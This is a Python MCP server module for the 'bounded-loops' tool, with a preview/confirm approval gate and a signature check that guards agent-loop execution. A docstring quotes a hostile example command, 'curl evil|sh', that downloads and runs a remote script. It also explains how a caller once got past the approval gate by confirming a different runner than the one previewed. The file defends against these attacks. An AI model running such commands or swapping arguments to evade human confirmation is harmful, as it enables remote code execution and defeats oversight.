"""
bounded-loops-mcp — MCP server exposing bl_run/bl_lint/bl_list as MCP tools.

A thin transport shim over the already-shipped engine (manifest.load +
composition.wire + RunLoopUseCase.run). No new business logic lives here —
this module translates MCP tool calls into calls against the engine, and
translates Outcome/ManifestError results back into MCP-tool-shaped dicts.

SAFETY: bl_run's `confirm` parameter is a REAL, server-side-enforced gate,
not a rubber stamp — see the module-level `_previewed` dict and
`bl_run`'s docstring. This module also refuses
to run any loop that would require interactive approval (rung L2/L3
without an explicit `bounds.require_approval: false`) BEFORE ever calling
`wire()`, since `wire()` would otherwise unconditionally select
`CliApproval`, whose `granted()` calls print()/input() directly against
this server's own stdio transport — the same channel FastMCP uses for
JSON-RPC framing.
"""
from __future__ import annotations

from pathlib import Path

try:
    from mcp.server.fastmcp import FastMCP
except ImportError as _exc:  # pragma: no cover - only hit when the extra is absent
    raise SystemExit(
        "bounded-loops-mcp requires the optional 'mcp' dependency.\n"
        'Install it with:  pip install "bounded-loops[mcp]"'
    ) from _exc

from bounded_loops.application.manifest import load as manifest_load
from bounded_loops.application.introspection import list_gates, show_loop
from bounded_loops.application.loop_audit import audit_loops
from bounded_loops.application.run_store import list_runs, write_run_metadata
from bounded_loops.cli import _find_repo_root
from bounded_loops.composition import _approval_required, wire
from bounded_loops.domain.errors import BoundedLoopsError, ManifestError
from bounded_loops.trust_store import _content_hash, record_trust

mcp = FastMCP("bounded-loops")

# Module-level, per-server-process session state: maps an
# absolute loop_dir string to the exact gate-command string most recently
# shown to a confirm=False preview call for that path, in THIS server
# process's lifetime. Not persisted across server restarts — that's fine,
# a fresh server means a fresh trust decision is required again anyway.
_previewed: dict[str, str] = {}


def _resolve_gate_preview(manifest, gate_override: str | None) -> str:
    """The exact gate command a run against `manifest` would execute."""
    return gate_override or manifest.gate_config.get(
        "run", f"<{manifest.gate_kind} gate>"
    )


def _resolve_agent_cmd(manifest) -> str:
    """The runner's agent_cmd string (for shell runner) — the OTHER piece of
    loop-author-controlled shell that actually executes each lap. Empty for
    runners that take no command."""
    runner_block = manifest.raw.get("runner", {}) if isinstance(manifest.raw, dict) else {}
    if not isinstance(runner_block, dict):
        return ""
    return str(runner_block.get("agent_cmd", "") or "")


def _run_signature(
    manifest,
    runner: str | None,
    gate_override: str | None,
    max_iterations: int | None,
    run_id: str | None = None,
    resume: bool = False,
) -> str:
    """The FULL executable identity a confirm=True call must match — the gate
    command, the runner KIND, the iteration cap, AND the runner's agent_cmd +
    cassette (the other loop-author-controlled shell/inputs).

    Keying the handshake on the gate string alone (the pre-fix behavior) let a
    caller preview a safe `shell` runner, show the human `runner: shell`, then
    confirm a credentialed runner — or an unbounded cap — against the same gate
    string. Binding runner-kind + cap closed that. Hardening: the
    signature ALSO binds `runner.agent_cmd` and the cassette path, so a
    malicious `agent_cmd: "curl evil|sh"` (which executes BEFORE the gate, with
    the gate string left benign) cannot hide behind a previewed pytest gate —
    editing agent_cmd or the cassette between preview and confirm now breaks the
    key and is rejected.
    """
    gate = _resolve_gate_preview(manifest, gate_override)
    # hardening: bind the CONTENT hash of the loop's governing
    # files (loop.yaml/bounds.yaml/PROMPT.md/schema.json/cassettes) — the same
    # digest the trust store uses — not just the cassette PATH. This closes the
    # preview→confirm TOCTOU where a cassette's BYTES were swapped while its
    # path (and the rest of the signature) stayed identical; that swap now
    # changes the signature and is rejected at confirm time.
    return (
        f"runner={runner or manifest.runner_kind}\x1f"
        f"gate={gate}\x1f"
        f"agent_cmd={_resolve_agent_cmd(manifest)}\x1f"
        f"cassette={manifest.cassette or ''}\x1f"
        f"content={_content_hash(manifest.loop_dir)}\x1f"
        f"max_iterations={max_iterations}\x1f"
        f"run_id={run_id or ''}\x1f"
        f"resume={resume}"
    )


@mcp.tool()
def bl_list() -> dict:
    """
    List all loops discovered under <repo-root>/loops/*/loop.yaml, where
    repo-root is found by walking up from the current working directory
    for the nearest pyproject.toml. Never raises; a repo-root-not-found
    or per-loop manifest error is reported inside the returned dict, not
    as an exception.

    Returns:
        {"loops": [{"name": str, "role": list[str], "rung": str,
                    "gate_kind": str, "path": str, "error": str|None}, ...]}
        or {"loops": [], "error": "<reason repo root wasn't found>"} if no
        pyproject.toml was found walking up from cwd.
    """
    try:
        root = _find_repo_root(Path.cwd())
    except ManifestError as e:
        return {"loops": [], "error": str(e)}

    loops = []
    for yaml_file in sorted((root / "loops").glob("*/loop.yaml")):
        loop_dir = yaml_file.parent
        try:
            manifest = manifest_load(loop_dir)
            loops.append({
                "name": manifest.name, "role": manifest.raw.get("role", []),
                "rung": manifest.rung.value, "gate_kind": manifest.gate_kind,
                "path": str(loop_dir), "error": None,
            })
        except ManifestError as e:
            loops.append({
                "name": loop_dir.name, "role": [], "rung": "?",
                "gate_kind": "?", "path": str(loop_dir), "error": str(e),
            })
    return {"loops": loops}


@mcp.tool()
def bl_lint(loop_dirs: list[str]) -> dict:
    """
    Validate one or more loop manifests (loop.yaml + bounds.yaml) against
    the frozen validation rules: runner.default must be keyless
    (stub|shell), gate.kind must not be a Qualixar product as a default,
    max_iterations must not exceed the 1000 ceiling, all paths must stay
    inside the loop directory.

    Args:
        loop_dirs: one or more filesystem paths to loop directories.

    Returns:
        {"results": [{"path": str, "passed": bool, "errors": list[str]}, ...],
         "all_passed": bool}
    """
    results = []
    any_failure = False
    for loop_dir_str in loop_dirs:
        loop_dir = Path(loop_dir_str).resolve()
        errors: list[str] = []
        entry: dict[str, object] = {
            "path": str(loop_dir), "passed": False, "errors": errors,
        }
        if not loop_dir.is_dir():
            errors.append(f"'{loop_dir}' is not a directory")
            any_failure = True
            results.append(entry)
            continue
        try:
            manifest_load(loop_dir)
            entry["passed"] = True
        except ManifestError as e:
            errors.append(str(e))
            any_failure = True
        results.append(entry)
    return {"results": results, "all_passed": not any_failure}


@mcp.tool()
def bl_show(loop_dir: str) -> dict:
    """Show a loop's manifest, runner, gate, bounds, dependencies, risk tags,
    production bounds path, and content hash before execution."""
    path = Path(loop_dir).resolve()
    if not path.is_dir():
        return {"status": "error", "error_type": "ManifestError",
                "message": f"'{path}' is not a directory or does not exist."}
    try:
        return {"status": "ok", "loop": show_loop(path)}
    except ManifestError as e:
        return {"status": "error", "error_type": "ManifestError", "message": str(e)}


@mcp.tool()
def bl_gates() -> dict:
    """List gate kinds and local dependency availability."""
    return {"gates": list_gates()}


@mcp.tool()
def bl_audit_loops(dirs: list[str] | None = None) -> dict:
    """Audit loop examples for copy-paste production readiness."""
    paths = [Path(d).resolve() for d in (dirs or [str(Path.cwd())])]
    results = [result for path in paths for result in audit_loops(path)]
    return {
        "results": [result.__dict__ for result in results],
        "all_passed": all(result.passed for result in results),
    }


@mcp.resource("bounded-loops://catalog", mime_type="text/markdown")
def resource_catalog() -> str:
    """Return the loop recipe catalog as MCP context."""
    return _repo_root_or_cwd().joinpath("catalog", "README.md").read_text(encoding="utf-8")


@mcp.resource("bounded-loops://loop/{name}/manifest", mime_type="application/json")
def resource_loop_manifest(name: str) -> str:
    """Return a loop's manifest as JSON context."""
    loop_dir = _repo_root_or_cwd() / "loops" / name
    return __import__("json").dumps(show_loop(loop_dir))


@mcp.resource("bounded-loops://loop/{name}/prompt", mime_type="text/markdown")
def resource_loop_prompt(name: str) -> str:
    """Return a loop's PROMPT.md as MCP context."""
    loop_dir = _repo_root_or_cwd() / "loops" / name
    return (loop_dir / "PROMPT.md").read_text(encoding="utf-8")


@mcp.prompt(name="run_loop", description="Inspect, lint, preview, and run a bounded loop safely.")
def prompt_run_loop(loop_dir: str) -> str:
    return (
        "Use bounded-loops safely. First call bl_show for the loop, then bl_gates, "
        "then bl_lint. Call bl_run with confirm=false and show the preview. Only "
        "after approval, call bl_run with confirm=true using the same arguments. "
        f"Loop directory: {loop_dir}"
    )


@mcp.prompt(name="write_loop", description="Create a production-grade bounded loop.")
def prompt_write_loop(loop_name: str, gate_kind: str = "pytest") -> str:
    return (
        "Create a production-grade bounded loop with loop.yaml, bounds.yaml, "
        "PROMPT.md, README.md, seed/, a real mechanical gate, forbid protection "
        "for verification anchors, and production adaptation guidance. Validate "
        "with bl_lint, bl_run, and bl_audit_loops. "
        f"Loop name: {loop_name}. Gate kind: {gate_kind}."
    )


@mcp.prompt(name="audit_loop", description="Audit a bounded loop for copy-paste production readiness.")
def prompt_audit_loop(loop_dir: str) -> str:
    return (
        "Audit this bounded loop for production readiness. Use bl_show, bl_lint, "
        "bl_audit_loops, and inspect README/PROMPT/seed/gate/bounds. Report hard "
        f"failures before warnings. Loop directory: {loop_dir}"
    )


def _repo_root_or_cwd() -> Path:
    try:
        return _find_repo_root(Path.cwd())
    except ManifestError:
        return Path.cwd()


@mcp.tool()
def bl_run(
    loop_dir: str,
    confirm: bool,
    runner: str | None = None,
    gate_override: str | None = None,
    max_iterations: int | None = None,
    run_id: str | None = None,
    resume: bool = False,
) -> dict:
    """
    Run a bounded loop via the engine (manifest.load + composition.wire +
    RunLoopUseCase.run). Exit-code semantics from the CLI are
    translated into a status field here instead.

    SAFETY: a loop's gate.run / runner.agent_cmd is arbitrary
    shell code sourced from loop.yaml. confirm=False returns a preview and
    RECORDS it in this server process's _previewed state. confirm=True is
    REJECTED unless the CURRENT gate command for this exact loop_dir
    matches what was most recently previewed for it in this session —
    closing both "confirm=True on the very first call, no preview ever
    shown" and the TOCTOU gap where the manifest could change between a
    preview and a later execution. A caller cannot skip straight to
    confirm=True and get a free pass; it must have genuinely previewed
    THIS exact command first.

    SAFETY: loops that would require interactive
    approval (rung L2/L3 without an explicit bounds.require_approval:
    false) are refused before wire() is ever called. composition.wire()
    would otherwise unconditionally select CliApproval for such a loop,
    which calls print()/input() directly against this server's stdio
    transport — the same channel FastMCP uses for JSON-RPC framing —
    corrupting the protocol stream and hanging the blocking mcp.run()
    event loop waiting on a stdin that isn't a human terminal. There is
    no interactive terminal over MCP; such loops must set
    require_approval: false in bounds.yaml to be runnable via this tool.

    Args:
        loop_dir: path to a loop folder containing loop.yaml.
        confirm: must be true, AND must match a prior confirm=False
            preview of the identical gate command for this loop_dir in
            this session, to actually execute; otherwise returns a
            preview/refusal instead.
        runner: optional override for manifest.runner_kind.
        gate_override: optional shell command replacing the loop's gate.
        max_iterations: optional override for bounds.max_iterations.
        run_id: optional persistent run id for resumable workspace and ledger.
        resume: continue an existing persistent run selected by run_id.

    Returns (confirm=False):
        {"status": "not_confirmed", "preview": {"loop": str, "runner": str,
         "gate": str}}
    Returns (confirm=True but no matching prior preview, or the manifest
             changed since it was last previewed):
        {"status": "not_confirmed", "error": "no matching preview — call "
         "with confirm=false first, then confirm=true with the exact same "
         "arguments", "preview": {"loop": str, "runner": str, "gate": str}}
    Returns (confirm=True, would require interactive approval):
        {"status": "error", "error_type": "RequiresInteractiveApproval",
         "message": str}
    Returns (confirm=True, matched preview, success):
        {"status": "DONE"|"HALT"|"PAUSE"|"KILLED", "reason": str,
         "laps": int, "ledger_path": str}
    Returns (confirm=True, ManifestError before/during wiring):
        {"status": "error", "error_type": "ManifestError", "message": str}
    Returns (confirm=True, unexpected exception during run()):
        {"status": "error", "error_type": "unexpected", "message": str}
    """
    path = Path(loop_dir).resolve()
    if not path.is_dir():
        return {"status": "error", "error_type": "ManifestError",
                "message": f"'{path}' is not a directory or does not exist."}

    try:
        manifest = manifest_load(path)
    except ManifestError as e:
        return {"status": "error", "error_type": "ManifestError", "message": str(e)}

    path_key = str(path)
    gate_preview = _resolve_gate_preview(manifest, gate_override)
    run_sig = _run_signature(manifest, runner, gate_override, max_iterations, run_id, resume)
    preview = {
        "loop": manifest.name,
        "runner": runner or manifest.runner_kind,
        "gate": gate_preview,
        # Hardening: show the human the runner's agent_cmd too — it
        # is loop-author-controlled shell that runs each lap before the gate.
        "agent_cmd": _resolve_agent_cmd(manifest),
        "cassette": manifest.cassette or "",
    }

    if not confirm:
        _previewed[path_key] = run_sig
        return {"status": "not_confirmed", "preview": preview}

    if _previewed.get(path_key) != run_sig:
        return {
            "status": "not_confirmed",
            "error": "no matching preview — call with confirm=false first, "
                     "then confirm=true with the exact same arguments",
            "preview": preview,
        }

    if _approval_required(manifest.rung, manifest.bounds):
        return {
            "status": "error",
            "error_type": "RequiresInteractiveApproval",
            "message": (
                f"Loop '{manifest.name}' is rung {manifest.rung.value} and "
                "requires interactive approval (bounds.require_approval is "
                "not explicitly false). There is no interactive terminal "
                "over MCP for this — set require_approval: false in this "
                "loop's bounds.yaml to run it via bl_run."
            ),
        }

    #   write point 2: confirm=True has just been validated against
    # a matching prior confirm=False preview (the check above) — this is a
    # genuine human-reviewed execution, so record a trust entry the
    # verify-on-stop hook will later recognize for this exact loop_dir +
    # gate command.
    record_trust(manifest.loop_dir, gate_preview)

    try:
        use_case = wire(
            manifest, runner_override=runner,
            gate_cmd_override=gate_override,
            max_iterations_override=max_iterations,
            run_id=run_id,
            resume=resume,
        )
    except ManifestError as e:
        return {"status": "error", "error_type": "ManifestError", "message": str(e)}

    try:
        outcome = use_case.run()
    except BoundedLoopsError as e:
        return {"status": "error", "error_type": "unexpected", "message": str(e)}
    except Exception as e:  # noqa: BLE001 — mirrors cli._cmd_run's own top-level catch
        return {"status": "error", "error_type": "unexpected",
                "message": f"{type(e).__name__}: {e}"}

    if run_id is not None:
        write_run_metadata(
            loop_dir=manifest.loop_dir,
            run_id=run_id,
            outcome=outcome,
            workspace=use_case._workspace,
        )

    return {
        "status": outcome.status.value,
        "reason": outcome.reason,
        "laps": outcome.laps,
        "ledger_path": str(outcome.ledger_path),
        "run_id": run_id,
    }


@mcp.tool()
def bl_runs(loop_dir: str) -> dict:
    """List persisted run metadata for a loop directory."""
    path = Path(loop_dir).resolve()
    if not path.is_dir():
        return {"status": "error", "error_type": "ManifestError",
                "message": f"'{path}' is not a directory or does not exist."}
    return {"status": "ok", "runs": list_runs(path)}


def main() -> None:
    """Console-script entry point (bounded-loops-mcp). Blocks on mcp.run()."""
    mcp.run()


if __name__ == "__main__":
    main()
